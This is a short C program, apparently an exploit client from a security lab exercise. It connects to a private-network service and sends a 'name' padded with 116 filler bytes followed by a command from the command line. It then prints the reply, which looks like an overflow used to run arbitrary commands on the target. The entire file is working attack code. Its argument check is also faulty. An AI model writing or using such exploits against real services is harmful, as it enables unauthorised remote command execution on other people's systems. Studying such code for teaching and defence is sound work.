#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <arpa/inet.h>


int main(int argc, char* argv[]) {
	
	if (argc < 1) {
		printf("Syntax: %s <command>\n", argv[0]);
  		exit(1);
  	}
	
	char *mycommand = argv[1];
	printf("My command: %s\n\n", mycommand);
	
	char msg[256];
	char *ptr = msg;
	memset(msg, 0, 256);
	for (int k = 0; k < 116; k++) {
		*(ptr + k) = 'a';
	}
	*(ptr + 116) = '\0';
	strcat(msg, mycommand);
	
//	printf("%s\n\n", msg);
	
	// Building destination addr_in
	struct sockaddr_in dest;
	dest.sin_family = AF_INET;
	dest.sin_port = htons(1234);
	if (inet_pton(AF_INET, "192.168.56.101", &(dest.sin_addr)) != 1) printf("inet_pton error\n\n");
	for (int k = 0; k < 8; k++) dest.sin_zero[k] = 0;

	// Building the socket
	int sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd == -1) {
		printf("Error building socket");
  		exit(1);
  	}
	
	// Connecting
	if (connect(sockfd, (struct sockaddr*) &dest, sizeof(struct sockaddr_in)) != 0) {
		printf("Failed to connect");
  		exit(1);
	}

	
	// Receiving stuff
	int buf_len = 2000;
	char recvbuf[buf_len];
	memset(recvbuf, 0, buf_len);
	if (recv(sockfd, recvbuf, buf_len, 0) == -1) {
		printf("Error sending message");
  		exit(1);
	}
//	printf("%s\n", recvbuf);
	
	// Sending name
	if (send(sockfd, msg, strlen(msg), 0) != strlen(msg)) {
		printf("Failed to send message entirely");
  		exit(1);
	}
	
	// Receiving more stuff
	memset(recvbuf, 0, buf_len);
	if (recv(sockfd, recvbuf, buf_len, 0) == -1) {
		printf("Error sending message");
  		exit(1);
	}
//	printf("%s\n", recvbuf);
	
	memset(recvbuf, 0, buf_len);
	if (recv(sockfd, recvbuf, buf_len, 0) == -1) {
		printf("Error sending message");
  		exit(1);
	}
	printf("%s\n", recvbuf);
	
	return 0;
	
}
